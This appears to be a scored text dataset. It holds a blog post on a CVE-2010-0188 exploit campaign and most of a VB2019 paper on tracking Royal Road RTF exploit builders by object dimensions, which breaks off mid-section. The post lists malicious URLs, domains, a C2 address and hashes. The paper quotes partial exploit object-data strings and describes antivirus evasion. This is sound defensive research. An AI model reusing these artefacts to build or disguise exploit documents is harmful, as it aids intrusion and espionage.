"Sample compromised URLs used in the campaign: hxxp://www.alacinc.org.nz/impdiscm.html; hxxp://viajesybuceo.es/impdiscm.html; hxxp://www.akncorporation.com/impdiscm.html; hxxp://www.smoc.tw/impdiscm.html; hxxp://www.mofty.net/impdiscm.html; hxxp://akweb.nl/webcalendar/includes/impdiscm.html; hxxp://fullhome.net/discinfo.html
Client-side exploits serving URLs: hxxp://netgear-india.net/detects/discover-important_message.php; hxxp://netgear-india.net/detects/discover-important_message.php?qejbu=360a070b03&tfy=35&xio=34023705350a050a0b38&wcxa=02000200020002; hxxp://teamscapabilitieswhich.org/detects/discover-important_message.php
Upon loading, these URLs attempt to exploit CVE-2010-0188 by dropping a malicious PDF file on the affected host, which then drops the actual malware upon successful client-side exploitation.
Sample detection rate for the dropped malware: MD5: 80601551f1c83ee326b3094e468c6b42 – detected by 4 out of 44 antivirus scanners as UDS:DangerousObject.Multi.Generic
Upon execution, the sample phones back to 200.169.13.84:8080/AJtw/UCyqrDAA/Ud+asDAA, AS21574
Client-side exploits serving domain reconnaissance:
teamscapabilitieswhich.org responds to 183.180.134.217, AS2519 – Email: anil_valiquette124@dawnsonmail.com
Name Server: NS1.CHELSEAFUN.NET – 173.234.9.89
Name Server: NS2.CHELSEAFUN.NET – 65.131.100.90
netgear-india.net – 183.180.134.217, AS2519
Name Server:  NS1.TOPPAUDIO.COM – 91.216.93.61
Name Server:  NS2.TOPPAUDIO.COM – 173.234.9.89
The same name servers (NS1.TOPPAUDIO.COM; NS2.TOPPAUDIO.COM) were also used in the recently profiled “BofA ‘Online Banking Passcode Reset’ themed emails serve client-side exploits and malware“; “‘ADP Immediate Notification’ themed emails lead to Black Hole Exploit Kit“, indicating a connection between these campaigns.
Responding to the same IP (183.180.134.217) are also the following malicious domains part of the campaign’s infrastructure:
rovo.pl
itracrions.pl
radiovaweonearch.com
unitmusiceditior.com
newtimedescriptor.com
steamedboasting.info
solla.at
votela.net
puzzledbased.net
stempare.net
questionscharges.net
bootingbluray.net
We’ve also seen (steamedboasting.info) used in the recently profiled “‘ADP Immediate Notification’ themed emails lead to Black Hole Exploit Kit” campaign, indicating that these campaigns are operated by the same cybercriminal/gang of cybercriminals.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.01056323824929195
VB2019 paper: Attribution is in the object: using RTF object dimensions to track APT phishing weaponizers,0.010128903785879939
Ghareeb Saad,0.010804472153305489
"Anomali, UK",0.008304653331859257
Michael A. Raggi,0.009215429143785925
"Proofpoint, USA",0.008719285870723237
"Table of contents
Abstract Exploit supply chain & the need for weaponizer attribution RTF exploitation RTF tracking and attribution techniques Metadata & author name Shellcode Obfuscation artifacts Object dimensions and phishing weaponizers Comparing RTF attribution techniques: pros and cons The Royal Road weaponizer Distinguishing between Royal Road versions Commodity actors adopt Royal Road Weaponizer life cycle Additional threat activity clusters based on RTF object dimensions Conclusion References YARA signatures Indicators of Compromise Goblin Panda / Conimes Reaver Temp.Hex Temp.Periscope / Leviathan / APT40 Temp.Trident Unattributed (Chinese APT) samples Sidewinder APT Formbook ‘n3o’ commodity campaigns Wuyan commodity campaigns",0.01709767198740697
Abstract,0.009485057568311417
"Typographers and font designers sometimes quip that the divine fingerprint of the artist exists in the spaces between the letters (‘God is in the Kerning’ – Matteo Bologna). They have also said ‘Nothing made by a human can avoid personal expression’ (Hrant Papazian). Anomali Labs has conducted an in-depth study of the unique object dimensions present in weaponized RTF exploits used in phishing attacks. Through this research we have found that, like typographers, the developers of malicious RTF weaponizers leave behind a unique fingerprint on the malicious phishing attachments they create. This fingerprint can be found in the unique height and width of the malicious objects present in a phishing attachment. So, if God can be found in the kerning, we, as threat researchers, believe that attribution is in the object.",0.014857624424386762
"RTF files are among the most popular file formats used in phishing attacks today. Anomali Labs has tracked the unique object dimensions present in 22 RTF exploits for CVE-2018-8570, CVE-2018-0802, CVE-2017-11882, CVE-2017-0199, CVE-2014-1761 and CVE-2012-0158 to gain insight into the adversary’s weaponization process. By identifying the height and width of malicious RTF objects and creating YARA signatures to track them, analysts have identified APT campaigns related to three distinct Chinese APT groups (Temp.Periscope, Temp.Trident and Goblin Panda), one South Asian APT (Sidewinder), and the cybercriminal campaigns of a known Pakistani APT group (Gorgon Group/Subaat). This paper will cover basic RTF object metadata structure, how this data, when unique, can be used to track threat actors, and an in-depth case study of Chinese and Indian APTs utilizing a shared RTF phishing weaponizer to carry out diverse espionage campaigns across Asia and Central Europe.",0.01570959355737589
Exploit supply chain & the need for weaponizer attribution,0.007307875889211335
"The use of weaponized exploits in targeted phishing attacks continues to be among the most popular and effective techniques observed by cybersecurity researchers today. The 2019 Verizon DBIR report cites ‘Email Attachment’ as the top malware infection vector in incidents and reports that Office documents and Windows applications are the most common infection vectors [1]. Among the Office documents utilized in cyber attacks, RTF file format is often used for phishing attachments and is regularly observed in espionage campaigns linked to prominent Advanced Persistent Threat (APT) adversaries. Rich Text Format (RTF) is a proprietary document file format created by Microsoft which has found popularity since its creation in 1987. The ubiquity of RTF attachments in APT attacks has led researchers to conduct an in-depth analysis of hundreds of weaponized RTF exploit files. This analysis has resulted in the development of a repeatable process for tracking the malicious files created by RTF phishing weaponizers and has introduced visibility into the threat actors’ supply chain for these weaponizer tools. Often, scripted phishing weaponizers will create malicious documents with predictable object dimensions for certain Common Vulnerability Exposures (CVEs). Based on these artifacts, it is possible to develop YARA detection signatures to allow analysts to study the spread and dissemination of phishing weaponizers across the threat landscape. With this visibility into the weaponization phase of the cyber kill chain, researchers can understand the origination point of weaponizers, which is invaluable for threat actor attribution. Additionally, the ability to detect and track these RTFs is highly advantageous to infosec organizations as it provides attack visibility during the delivery phase of a potential intrusion.",0.01845388548364646
"This paper presents a new technique for attributing RTF weaponizers using object dimensions. Researchers have studied more than 6,000 malicious RTF samples and have been able to group and attribute more than 27 different RTF weaponizers using object dimensions. An RTF weaponizer for CVE-2017-11882, CVE-2018-0802 and CVE-2018-0798, dubbed ‘Royal Road’, was discovered being used in espionage campaigns, and ultimately released into the commodity threat landscape. Royal Road is believed to have originated amongst a group of Chinese APTs conducting espionage campaigns from 2017 to 2019. In 2018, it was observed being used by the Indian APT actor Sidewinder, and in 2019 it was seen being adopted by cybercriminal actors. The diffusion of custom weaponizers like Royal Road, from exclusive usage by its developers or purchasers through to its ultimate emergence as a commodity tool, will be explored as a recurring pattern which we refer to as the ‘Weaponizer Life Cycle’.",0.013390432124884222
RTF exploitation,0.006039666565969659
"Rich Text Format was developed by Microsoft from 1987 until 2008, and remains supported by Windows, Mac and Linux operating systems. The RTF format was created to enable cross-platform document interchange. This file format has, for years, been a popular target for vulnerability researchers and exploit developers because it can host different object types. The object types include: annotations, fonts, pictures, OLE and SWF. This allows adversaries to deliver exploits from different object types, often by attaching RTF files to phishing emails. The versatility of the RTF format for exploit delivery from different object types has given rise to the following popular CVEs:",0.010360316135281322
CVE-2014-1761,0.008918009511553082
CVE-2015-7645,0.008516381861390698
CVE-2016-4117,0.009330919242930391
CVE-2016-1019,0.009417616839695664
CVE-2017-0199,0.009717047293436476
CVE-2017-8570,0.0099969806182989
CVE-2017-11882,0.010503117797025618
CVE-2018-0802,0.00905787717343065
CVE-2018-0798,0.009653754839611839
RTF tracking and attribution techniques,0.009289282464862492
"There are many aspects of RTF files that can be used to conduct analysis or track weaponized exploits for attribution purposes. In this paper we will focus on four specific techniques that can provide insight into both adversary operators and adversary supply chains. These four techniques include the tracking of RTF metadata, shellcode, obfuscation, encoding artifacts and object dimensions.",0.015683758123665625
Metadata & author name,0.00959153537789903
"In addition to accommodating objects, RTF files can include metadata ‘Tag ID’ values that can be used to support threat actor attribution. Specifically, analysis of the metadata tag IDs for ‘author’, ‘company’, ‘operator (last modified by)’, ‘title’ and ‘vern’ (internal version number) associated with RTF phishing attachments can provide string values that can be leveraged as indicators of compromise. These metadata tag IDs should be recorded and attributed to a threat actor if observed in multiple campaigns over time, alongside additional overlapping IoCs or tactics techniques and procedures (TTPs). Metadata tag ID values can be observed in the strings of the RTF as well as through proprietary analysis tools such as VirusTotal Enterprise in the description section of an uploaded malware binary. The tag values for author and operator fields are derived from the machine used to create the RTF phishing attachment. In some instances, if the operator is using an application like Microsoft Office to create a weaponized phishing attachment, file compilation will apply the author value associated with the operator’s application to the created malicious file. Additionally, a unique value for the ‘vern’ or internal version number will be applied to all malicious phishing attachments created by that code base. The example shown in Figure 1 from the VirusTotal interface demonstrates a recurring metadata author value that was used by a CVE-2012-0158 phishing weaponizer attributed to the Chinese Goblin Panda APT, also known as Conimes. This technique has been explored at length in a SANS CTI Summit presentation on the topic [2].",0.016456678191320462
Figure 1: VirusTotal user interface showing RTF metadata author ‘Tag ID’ and strings.,0.013353293461902949
"Although RTF metadata tag ID tracking is a useful method, over time, to develop attribution based on RTF attachments in targeted campaigns, there are limitations to this technique. In many cases RTF metadata is fleeting and trivial to alter from campaign to campaign. Often these values are updated to mimic regionally specific personnel at targeted organizations and changed to the native languages spoken by the targets. Additionally, RTF metadata tags are not mandatory values that must be included upon the compilation of an RTF file. In some cases adversaries have removed RTF metadata tag IDs from weaponized RTF attachments upon updating a phishing weaponizer. Based on the inconsistent and non-essential nature of RTF metadata as a social engineering mechanism in weaponized RTFs, this tracking method provides the best visibility, over multiple campaigns, of the operator’s personas and possible targeting intention, while being a fleeting indicator of compromise.",0.018867342085056138
Shellcode,0.007401455902133924
"Certain characteristics of the shellcode used to exploit a vulnerability targeted by a malicious RTF can be used to track certain RTF weaponizers. The most common characteristic of shellcode would be certain Return Oriented Programming (ROP) gadgets being used by the exploit or the technique used to drop and execute the payload. While these characteristics are usually permanent and rarely changed, it is usually difficult to develop YARA rules to automatically track them.",0.014866089077162359
Obfuscation artifacts,0.008155882386209456
"The Office RTF parser and RTF file specification is very flexible from a development standpoint. One of the most flexible features of an RTF file is the allowance of cascading objects, which can represent data in different formats and escape characters. Exploit developers make use of this functionality to build obfuscated payloads that are still valid when rendered in Office, but which can evade AV engines by representing malicious internal content in formats other than what is most commonly used in AV static signature detection. This has the beneficial secondary outcome of making it harder for analysts to extract or analyse the malicious payload.",0.01087600076823092
"Actors often deploy scripts to insert custom obfuscation gadgets into their malicious RTFs. Using these gadgets as strings in YARA signatures is a very useful method for tracking RTFs created for certain campaigns or actors. There are multiple articles and papers discussing RTF obfuscation in detail [3, 4]. Figures 2 to 4 show some examples of RTF obfuscation gadgets that can be used to track malicious RTFs.",0.01865811506670434
Figure 2: Obfuscation gadget present in Royal Road weaponizer version 2.,0.007270578247108861
Figure 3: Example of obfuscation gadget used in malicious RTFs.,0.01592694130773642
Figure 4: Example of obfuscation gadget used in malicious RTFs.,0.015742188431673965
Object dimensions and phishing weaponizers,0.00835648286626045
"CVEs and exploits are often purchased from digital black markets as Python scripts that can be used to weaponize a lure document. Alternatively, weaponizers have been known to be developed as internal tools for APT organizations. Based on the popularity of Word for rendering email attachments, threat actors usually build their lure ‘.doc’ using a normal Office application and then use the acquired script to inject the malicious RTF object into the lure document once it has been created.",0.014902362941166203
"Based on RTF specifications, any object that has a graphical representation (which will most commonly be rendered in Word) needs to specify the object dimension as part of the RTF object header. This is to say that the object height and width for graphic representation are included in the strings of the compiled RTF file to ensure that an error will not occur when attempting to load the object. Table 1 includes a list of the object dimensions and attributes that can be included in an RTF object header at the time of compilation.",0.014573280521447796
"Object size, position, cropping and scaling",0.009237268547528932
"\objh
N",0.008505474834065385
"N
is the original object height in twips, assuming the object has a graphical representation.",0.013306765649618746
"\objw
N",0.00804875570810859
"N
is the original object width in twips, assuming the object has a graphical representation.",0.01300608227194111
\objsetsize,0.008588711644728075
Forces the object server to set the object’s dimensions to those specified by the client.,0.01101134819147831
"\objalign
N",0.009944574127801142
"N
is the distance in twips from the left edge of the objects that should be aligned on a tab stop. This is needed to place
Equation Editor
equations correctly in line.",0.011330815750220657
"\objtransy
N",0.008263380911930573
"N
is the distance in twips the objects should be moved vertically with respect to the baseline. This is needed to place
MathType
equations correctly in line.",0.013142056326513218
"\objcropt
N",0.009172384945288603
"N
is the top cropping distance in twips.",0.015015182094126334
"\objcropb
N",0.008676710600927007
"N
is the bottom cropping distance in twips.",0.01431283895597013
"\objcropl
N",0.008409088971215395
"N
is the left cropping distance in twips.",0.015271296954127322
"\objcropr
N",0.0093730700939888
"N
is the right cropping distance in twips.",0.01585183819099578
"\objscalex
N",0.008871209349555431
"N
is the horizontal scaling percentage.",0.014748650562790733
"\objscaley
N",0.009015508022941043
"N
is the vertical scaling percentage.",0.014459494783937932
Table 1: Object dimensions and attributes that may be present in RTF header.,0.013626877998076825
"If the malicious RTF exploit object has a graphical representation (most phishing attachments do), the object dimensions are crafted inside the weaponizer script and included in the strings of the malicious RTF exploit. An extended study of multiple RTF weaponizers and malicious RTF files targeting numerous vulnerabilities proved that the object dimension are very often unique numbers. Specifically, the object height and width were frequently found to be unique and it was observed that they never changed across the usage of certain weaponizers, even in instances when the weaponizer was being utilized by multiple actors deploying diverse shellcode. Whereas the RTF obfuscation and final delivered payload may change, the RTF object dimensions were found to remain constant.",0.01114839207852203
"Interestingly, RTF object dimensions are rarely used by anti-virus (AV) engines to detect malicious RTF files. This current lack of object dimension-based detection may be why developers do not need to change object dimension to bypass AV engines. On the other hand, metadata, obfuscation and shellcode (all used in other attribution techniques) tend to be changed regularly by actors attempting to bypass AV detection. We noticed in multiple cases that, even when the actors were very successful in updating their weaponizer to provide better AV detection evasion, a simple YARA rule tracking the object dimension was able to find the malicious RTF created by a new version of the weaponizer. Figure 5, is the strings section from a malicious RTF sample created by the Royal Road RTF weaponizer. We successfully tracked samples created by this weaponizer via a YARA rule to detect the unique object dimensions. The static AV detections in VirusTotal, which are shown in Figure 6, failed to detect many of these samples with accuracy. Specifically, in the sample included in Figure 6, only one AV engine identified the sample as an exploit for CVE-2017-11882. Adversaries were likely able to evade AV detection by manipulating the shellcode and employing updated obfuscation techniques. The use of YARA signatures to detect object dimensions for phishing weaponizers provides researchers with a way to identify malicious RTFs that is independent of adversary obfuscation attempts.",0.018707572397149153
Figure 5: Object dimension strings from a Royal Road version 2 sample.,0.011922006965781717
Figure 6: VirusTotal AV detection for Conimes / Goblin Panda RTF sample identified via YARA signature for RTF object dimensions ‘objh2180/objw300’.,0.01332378455423322
"The tracking of RTF object dimensions has led researchers to identify 27 unique weaponizers that include APT, cybercriminal and public tools. Of the over 6,000 malicious RTF files analysed, 4,445 contained unique object dimensions. This demonstrates how distinct object dimensions are per weaponized RTF sample and reinforces that a cluster of shared object dimensions between samples is an indication that they were likely created by the same weaponizer.",0.01582319798680032
Comparing RTF attribution techniques: pros and cons,0.010067123011497592
Technique,0.008333623586516903
Pros,0.008744116929347956
Cons,0.011032131815201796
Metadata and author name (fleeting & operator‑centric),0.01333966656706076
"Operator-centric
Provides context via social engineering content and language of targets (‘human fingerprint’)
Can be used to track specific campaigns
Actor-specific
Easy to track",0.014972471657029307
"Trivial to change
Not required in all weaponized files
Regularly evolving",0.008317190157768883
RTF obfuscation artifacts (evolving & supply-chain-centric),0.0159904716022089
"Unique to shellcode developer
Supply-chain-centric
Can facilitate attribution and correlations between threat actors
Easy to track using YARA rules",0.009780183505463391
Regularly evolving with high turnover so threat actors can bypass AV detection,0.010304320691384095
Shellcode (permanent & operator-centric),0.011995629641815664
"A more permanent actor artifact to track
Usually specific to a single actor
Difficult for actors to change entirely",0.010909372411235574
"Complex to create a signature, specifically utilizing YARA rules to track shellcode",0.008168668563310666
Object dimensions (permanent & supply-chain-centric),0.018702440705381407
"Very specific to weaponizer developer & exploit supplier
Does not change regularly
Allows attribution of a shared exploit supply chain
Maps relations between different connected groups",0.008793493410149678
"Does not provide operator visibility
If multiple actors are using the weaponizer it does not provide deeper attribution to a specific group",0.009368818934302192
Table 2: Comparison of RTF attribution techniques.,0.019849843834544023
Figure 7: Quadrant view of permanence versus operational visibility in RTF attribution techniques.,0.021765388119187823
The Royal Road weaponizer,0.007896071033447138
"Researchers have identified a unique phishing weaponizer that, to date, has been utilized in Chinese and South Asian APT targeted attacks, as well as in cybercriminal campaigns. The weaponizer, which has been dubbed ‘Royal Road’, is believed to be a code base capable of creating weaponized RTF exploits complete with believable lure content for CVE-2017-11882, CVE-2018-0802 and CVE-2018-0798. This weaponizer has primarily been used by Chinese APT actors in espionage campaigns supporting intelligence requirements for the Belt and Road Initiative in Central Asia, Russia, Vietnam and Mongolia, but also with the targeting of US maritime, academic and defence sectors. Specifically, the weaponizer can be identified by the unique object dimensions objh2180/objw300 appearing in the malicious RTF’s strings. Further variations of this weaponizer can be identified by the object data which follows the object dimensions, the metadata associated with the RTF files, and an examination of post-exploitation infection techniques utilized by disparate threat actors.",0.012252137081241066
"Versions of the Royal Road tool weaponize RTF files to exploit CVE-2017-11882, CVE-2018-0802, and CVE-2018-0798, which affect the Microsoft Equation Editor. CVE-2017-11882 and CVE-2018-0802 were patched by Microsoft in November 2017 and January 2018, respectively. The lesser‑known CVE-2018-0798 was also patched in January 2018. Since then, RTF files exploiting these vulnerabilities in malspam campaigns pushing malware like LokiBot and Formbook have been well documented. By now, exploits for Equation Editor vulnerabilities are old news, and more than 1,000 samples have been submitted to VirusTotal since November 2017. Chinese APT threat actors adapted these popular vulnerabilities into exploits immediately following their disclosure by Microsoft. The use of a specific weaponizer to exploit well-known vulnerabilities allows analysts both to attribute In-the-Wild (ItW) samples and to gain insight into the supply chain associated with numerous APTs across international boundaries.",0.01202763090684611
Distinguishing between Royal Road versions,0.009190979521826237
"All identified weaponized RTF samples created by the Royal Road tool were found to share the unique RTF object dimensions objh2180/objw300. This shared dimension allowed us to draw connections between diverse samples created by the tool, as variation exists between different versions of the weaponizer which include unique object data spanning five distinct versions. Additionally, two distinct methods for executing post-exploitation payloads were found, which serve as the primary method for distinguishing between Chinese APT activity and activity associated with the Sidewinder APT. Finally, further variation was identified and documented in the methods used amongst disparate Chinese APTs to perform DLL side-loading following execution.",0.013495152063827565
"Four distinct clusters of Chinese APT activity have been observed utilizing RTF files that contain the Royal Road unique object dimensions. Version 1 utilizes the object data string objw2180\objh300{\*\objclass Equation.3}{\*\objdata 01050000020000000B0000004571756174 and exploits CVE-2017-11882. Versions 2 and 4 utilize the object data string objw2180\objh300{\objdata 554567{\*\objdata 01050000020000000B0000004571756174696F6E2E and exploit both CVE-2017-11882 and CVE-2018-0802. Several of these APT groups have utilized exploits for both CVE-2017-11882 (two versions) and CVE-2018-0802 at different times, representing a shared and evolving supply chain between Chinese threat actors. Version 4 of the Royal Road weaponizer was observed being utilized by the Sidewinder APT group, using the object data string objw2180\objh300{\objdata 554567{{\*\objdata 1389E614020000000B0000004571756174696F6E2 to exploit CVE-2017-11882. This string is highly similar to the object data string from Royal Road versions 2 and 4.",0.01650214712212661
"A fifth variation of the Royal Road builder was also observed in use by Chinese APT actors. The analysed RTF files share the same object dimension (objw2180\objh300) as used to track the RTF weaponizer. However, in this case the samples were not exploiting CVE-2017-11882 or CVE-2018-0802. After further analysis, it was discovered that the RTF files were exploiting the CVE-2018-0798 vulnerability in Microsoft’s Equation Editor (EQNEDT32). CVE-2018-0798 does not appear to be commonly exploited in the wild, even though is more reliable than its better-known Equation Editor RCE counterparts. Its reliability is rooted in its efficacy among all Microsoft Word versions that include the Equation Editor. Its counterparts CVE-2017-11882 and CVE-2018-0802 are limited to specific versions based on the patches that have been deployed. CVE-2017-11882 is only exploitable on an unpatched version prior to its fix, and CVE-2018-0802 is only exploitable on the version released to fix CVE-2017-11882. In contrast, a threat actor utilizing CVE-2018-0798 has a higher likelihood of success because it is not limited by version. Files containing the Royal Road object dimensions and the following string have been classified as Royal Road v5: objw2180\objh300\objdata\object 5154\781\'e56\'2f7\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000002e0000d01.",0.01154598118253436
Version,0.008689682892743633
Object string,0.00770155788029836
Description,0.014276898542484706
Royal Road v1,0.008431894250220284
objw2180\objh300{\*\objclass Equation.3}{\*\objdata 01050000020000000B0000004571756174,0.012017405776859391
"No obfuscation
Exploits CVE-2017-11882
8.t post-exploitation technique & execution of shellcode
Used by Chinese APTs
Temp.Periscope and Goblin Panda",0.006534414969841751
Royal Road v2,0.008323851350001688
objw2180\objh300{\objdata 554567{\*\objdata 01050000020000000B0000004571756174696F6E2E,0.012234393846239477
"Started using RTF obfuscation gadgets to evade AV detection
8.t post-exploitation technique & execution of shellcode
Exploits CVE-2017-11882
Used by Chinese APTs Nomad Panda, Dagger Panda and Goblin Panda",0.008729942390258483
Royal Road v3 (Sidewinder),0.0135810864192637
objw2180\objh300{\objdata 554567{{\*\objdata 1389E614020000000B0000004571756174696F6E2,0.011764621469255943
"Similar RTF obfuscation gadgets to v2
Post-exploitation uses HTA download & execution of shellcode
Exploits CVE-2017-11882
Used by Sidewinder APT",0.0076135005401147815
Royal Road v4,0.008558101155633935
objw2180\objh300{\objdata 554567{\*\objdata 01050000020000000b0000004571756174696f6e2,0.012233620844953608
"Similar RTF obfuscation gadgets to v2.
8.t post-exploitation technique & execution of shellcode
Exploits CVE-2018-0802
Used by Nomad Panda, Dagger Panda, Goblin Panda, the group responsible for the Reaver malware, and Temp.Hex",0.007780046968927312
Royal Road v5,0.008112479776344772
objw2180\objh300\objdata\object 5154\781\’e56\’2f7\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000002e0000d01,0.013705966042903528
"8.t post-exploitation technique & execution of shellcode
Exploits CVE-2018-0798
Used by Nomad Panda, Dagger Panda, Goblin Panda, and Temp.Hex",0.006631141171429822
Table 3: Table comparing the different versions of Royal Road weaponizer.,0.01325338313700719
"Among the Chinese groups to use Royal Road are the APTs Goblin Panda (Conimes), Temp.Trident (Dagger Panda and Nomad Panda, Ice Fog), Temp.Periscope (APT40, Leviathan, MudCarp), the APT group associated with the Reaver malware, and Temp.Hex (Maudi Surveillance Operation). Goblin Panda (Conimes) has historically targeted Vietnam, utilizing Royal Road RTF phishing attachments to deliver a payload identified as ‘QCRat’. This payload is identifiable via the vulnerable McAfee DLL that was utilized for DLL side-loading (QCLite.dll and QCConsol.exe). This group has subsequently utilized additional malicious PE files side-loaded by legitimate dynamic-link libraries (DLLs) as well as PowerShell scripts in phishing campaigns to deliver malware families including Newcore RAT and Gh0st. Royal Road RTF samples are often attributable to Conimes by their distinctive Vietnamese language lures and file names, as well as through recognizable post-infection DLL side-loading techniques.",0.018584253773719084
Actor,0.01085136461970515
Targeting,0.009448943697125567
Potential motivation,0.008493901064395404
Methodology,0.010046877663876352
Unique tools,0.008708003280614274
Goblin Panda (Conimes),0.009891136003828738
Vietnam and Southeast Asia,0.010385918417371132
Espionage aligned with commercial and South China Sea issues,0.015352054602328025
RTF phishing followed by shellcode executed via an OLE package dropping distinctive source file 8.t,0.007159490610081587
QCRat Gh0st Newcore,0.00896294957320909
"Temp.Periscope (APT40, Leviathan, MudCarp)",0.016463690829706334
US Defence; maritime; academic institutions; international & political organizations,0.01502526102732138
Intellectual property theft and military espionage,0.00930501341436285
RTF phishing followed by shellcode executed via an OLE package dropping distinctive source file 8.t,0.007159490610081587
DadBod EvilTech AirBreak HomeFry MurkyTop,0.010594754709056797
"Nomad Panda & Dagger Panda
(Temp.Trident, Icefog)",0.010855363900013515
Mongolia and Central Asia,0.010563430052674572
Economic espionage for Belt & Road Initiative,0.00974743205057671
RTF phishing followed by shellcode executed via an OLE package dropping distinctive source file 8.t,0.007159490610081587
Fucobha Icefog (shared) Gh0st,0.008686801070305505
"Temp.Hex (The Maudi Surveillance Operation [
5
])",0.015272651671505155
Mongolia,0.007704730128230364
"Local Chinese interests, human rights activists, Mongolian diplomatic affairs",0.011975163391125254
RTF phishing followed by shellcode executed via an OLE package dropping distinctive source file 8.t,0.007159490610081587
"FireShadow Poison Ivy Maudi Tool Suite
PlugX",0.00973702607119964
APT responsible for the Reaver malware,0.00821137535586558
SE Asia and India. Areas associated with dissidents tied to the Chinese Five Poisons,0.009530230036655984
Five Poisons targeting,0.008071973628731466
RTF phishing followed by shellcode executed via an OLE package dropping distinctive source file 8.t,0.007159490610081587
"Reaver
Sun Orcal",0.009238709683756952
Table 4: Table characterizing Chinese APT groups utilizing the Royal Road weaponizer.,0.0177169497013564
"Temp.Periscope (APT40, Leviathan) has historically targeted US and international institutions associated with naval and maritime issues affecting the South China Sea while supporting the theft of intellectual property. This was the first group observed utilizing the Royal Road weaponizer, however, it appears to have ceased using it around December 2017 following patch adoption for CVE-2017-11882.",0.01644916328470003
"Temp.Trident (Dagger Panda & Nomad Panda, Icefog) has historically targeted the Mongolia region (Dagger Panda) alongside Russia and Central Asia (Nomad Panda), likely as part of economic espionage efforts in support of the Chinese Belt and Road Initiative. Versions of the custom payload ‘Fucobha’ or ‘Icefog’, which was first identified in 2013, have been identified as part of these campaigns. These campaigns have also leveraged more common payloads utilized by Chinese APT groups like Gh0st RAT. Historically, Royal Road RTF samples attributed to this APT have included distinctive RTF metadata author information that recurs across campaigns.",0.014712133230308955
"The APT group responsible for the Reaver and Sun Orcal malware is also believed to utilize the Royal Road exploit builder. This group was the first to be observed utilizing Royal Road v4, which exploited CVE-2018-0802. Historically, this group is known to target groups that oppose the Chinese governmental doctrine of ‘One China’. The targeted groups are often referred to as ‘the Five Poisons’ and include acolytes of Falun Gong, Muslim Uyghurs, supporters of Chinese democracy, supporters of an independent Taiwan, and Tibetans. Since these groups consist primarily of dissidents, the geography associated with Reaver and Sun Orcal targeting is diverse and is believed to be any location where these populations reside. Researchers at Cylance publicized Reaver RTF exploits built using the Royal Road tool in May 2019 and reinforced the observation of tool sharing among Chinese APT groups at that time [6].",0.01043010319243265
"Another Chinese APT group known to target Mongolia has been identified through this research. The APT known as Temp.Hex and the Maudi Surveillance Operation has been observed utilizing the Royal Road v5 weaponizer. In addition to these distinct Chinese APTs using a common RTF weaponizer, they all share a common post-exploitation execution technique. Rather than downloading and executing a malicious file, the RTF document drops and executes shellcode via an encoded OLE package which then drops a distinctive source file named ‘8.t’ to execute a payload. This method was identified earlier by security analysts in open sources. Anomali Threat Research identified the presence of the unique object dimension objw871\\objh811\\objscalex8\\objscaley8 in RTF files involved with this post-exploitation method. Signature alerts for this object’s dimensions indicate the use of the 8.t exploitation technique. The presence of both a shared phishing weaponizer and a shared post-exploitation execution technique between these groups is indicative of a significant TTP overlap. It is noteworthy that, after the use of the 8.t source file that is dropped to the temp directory, different files, registries and DLLs are used to execute the malicious payload on the host. The weaponizer and exploitation techniques are shared, but different post‑infection techniques and payloads are utilized. Varying degrees of overlap have been observed between the post-exploitation techniques of the five Chinese APTs using the Royal Road weaponizer.",0.018592915253629272
An attribution timeline of publicly available samples is shown in Figure 8.,0.011656332176589568
Figure 8: Attribution timeline of public Royal Road RTF samples.,0.01421536611455565
"Unlike the Chinese groups, limited use of the Royal Road weaponizer by the Indian APT actor Sidewinder has been observed. Only version 3 of the weaponizer and three total samples have been observed. Specifically, the RTF exploit for CVE-2017-11882 utilized by Sidewinder contains the string objw2180\objh300{\objdata 554567{{\*\objdata 1389E614020000000B0000004571756174696F6E2. These dimensions and format are notably similar to the format observed in the Royal Road CVE-2017-11882 v2 tool used by Chinese groups with only the object data obfuscation gadget varying between the samples. The post-exploitation methodology used by the Sidewinder operators deviates completely from what is utilized by other APT groups. The RTF downloads and executes a payload via an HTA file. The Sidewinder APT has historically targeted organizations linked to the Pakistani Military and is believed by security researchers to be an actor associated with Indian espionage interests, possibly operating as a contractor in the space. However, the use of weaponized RTF files with unique object dimensions in phishing campaigns relies on the successful exploitation of CVE-2017-11882, in which the opened RTF file downloads and executes HTA files on the victim’s machine. Primarily English language phishing files that utilize topics involving the military borders of India, China and Pakistan were weaponized and required execution by the victim to pull down additional files including a malicious HTA file. Once the HTA file was downloaded from a C2 domain and executed, a PowerShell payload contained in the HTA file was executed on the victim’s system. Another noteworthy aspect of the use of the Royal Road weaponizer by the Sidewinder APT is that it was extremely brief. Three samples have been identified from mid-2018. Subsequent Sidewinder campaigns have been identified which suggest that the group is no longer utilizing RTF files as their initial phishing attachments, but are rather using ‘.docx’ files which download RTFs that exploit the Equation Editor exploit CVE-2017-11882. These new RTFs do not contain object dimensions.",0.017086149871985534
"Utilization of the Royal Road weaponizer v5 exploiting CVE-2018-0798 was attributed to Temp.Trident (Nomad Panda and Dagger Panda), Conimes (Goblin Panda) and Temp.Hex. Researchers were able to identify multiple samples of malicious RTF documents using this weaponizer in the wild. However, determining a precise date of first use is challenging. Some of the analysed samples have a creation date of 19 November 2017 (five days after a patch was released for CVE-2017-11882) – however, that date appears to be manipulated based on the recent compilation dates of the payloads observed, many of which date to 2019. Researchers place a likely date of first usage in the wild around October 2018 based on a sample (e228045ef57fb8cc1226b62ada7eee9b) with a VirusTotal submission date of 29 October 2018 with the RTF creation time of 23 October 2018. This earliest observed sample has been attributed to Conimes. Multiple samples analysed by security researchers that we associate with CVE-2018-0798 have been mentioned in previous instances and detection signatures by others in the security community. We believe that some of these samples were misattributed to CVE-2017-11882 or CVE-2018-0802 based on their exploitation of the Equation Editor, despite being classified as CVE-2018-0798.",0.015428927236753931
Commodity actors adopt Royal Road,0.010066851799583776
"After the brief utilization of Royal Road by the Sidewinder APT and its continuous utilization by Chinese APT groups, a new pattern of usage emerged. On 10 March 2019, analysts discovered a new man-in-the-middle (MitM) phishing campaign that appeared ultimately to deliver the Formbook malware via CVE-2017-11882 RTF exploits. The campaign delivered malicious attachments to users in the address books of compromised victims. These weaponized RTF attachments included the object dimensions of the Royal Road weaponizer, objw2180\\objh300, along with additional object dimensions objw1479\\objh975.",0.012893092343300161
Figure 9: Unique object dimensions present in weaponized commodity RTF attachments.,0.017174343765322675
